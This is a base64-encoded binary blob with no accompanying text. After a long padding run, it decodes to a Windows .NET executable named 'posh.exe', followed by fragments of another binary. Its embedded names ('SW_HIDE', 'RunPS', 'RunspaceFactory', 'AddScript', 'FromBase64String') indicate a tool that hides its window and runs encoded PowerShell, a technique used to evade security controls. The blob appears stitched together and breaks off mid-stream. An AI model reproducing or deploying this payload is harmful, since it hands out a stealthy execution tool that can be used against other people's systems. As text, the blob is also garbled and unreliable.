QQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQAAAE1akAADAAAABAAAAP//AAC4AAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAAAOH7oOALQJzSG4AUzNIVRoaXMgcHJvZ3JhbSBjYW5ub3QgYmUgcnVuIGluIERPUyBtb2Rl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dEF0dHJpYnV0ZQBrZXJuZWwzMi5kbGwAdXNlcjMyLmRsbABTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uAFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUnVuc3BhY2VzAFJ1bnNwYWNlRmFjdG9yeQBSdW5zcGFjZQBDcmVhdGVSdW5zcGFjZQBPcGVuAFJ1bnNwYWNlSW52b2tlAFBpcGVsaW5lAENyZWF0ZVBpcGVsaW5lAENvbW1hbmRDb2xsZWN0aW9uAGdldF9Db21tYW5kcwBBZGRTY3JpcHQAU3lzdGVtLkNvbGxlY3Rpb25zLk9iamVjdE1vZGVsAENvbGxlY3Rpb25gMQBQU09iamVjdABJbnZva2UAQ2xvc2UAU3lzdGVtLlRleHQAU3RyaW5nQnVpbGRlcgBTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYwBJRW51bWVyYXRvcmAxAEdldEVudW1lcmF0b3IAZ2V0X0N1cnJlbnQAQXBwZW5kAFN5c3RlbS5Db2xsZWN0aW9ucwBJRW51bWVyYXRvcgBNb3ZlTmV4dABJRGlzcG9zYWJsZQBEaXNwb3NlAFRvU3RyaW5nAFN0cmluZwBUcmltAEVuY29kaW5nAGdldF9Vbmljb2RlAENvbnZlcnQARnJvbUJhc2U2NFN0cmluZwBHZXRTdHJpbmcAAAADIAAAAAAAEia8UX96xUKNIcRtUFz57wAIt3pcVhk04IkCBggEAAAAAAQFAAAAAwAAGAUAAgIYCAMgAAEEAAEODgQAAQEOAwAAAQQgAQEIBCABAQ4IMb84Vq02TjUEAAASGQUgAQESGQQgABIhBCAAEiUIIAAVEikBEi0GFRIpARItCCAAFRI1ARMABhUSNQESLQQgABMABSABEjEcAyAAAgMgAA4aBwkSGRIdEiEVEikBEi0SMRItDhUSNQESLQIEAAASRQUAAR0FDgUgAQ4dBQQHAhgOAwcBGAgBAAgAAAAAAB4BAAEAVAIWV3JhcE5vbkV4Y2VwdGlvblRocm93cwEAvCgAAAAAAAAAAAAA3igAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAANAoAAAAAAAAAAAAAAAAAAAAAAAAAABfQ29yRXhlTWFpbgBtc2NvcmVlLmRsbAAAAAAA/yUAIEAAAAAAAAAAAAAAAAAA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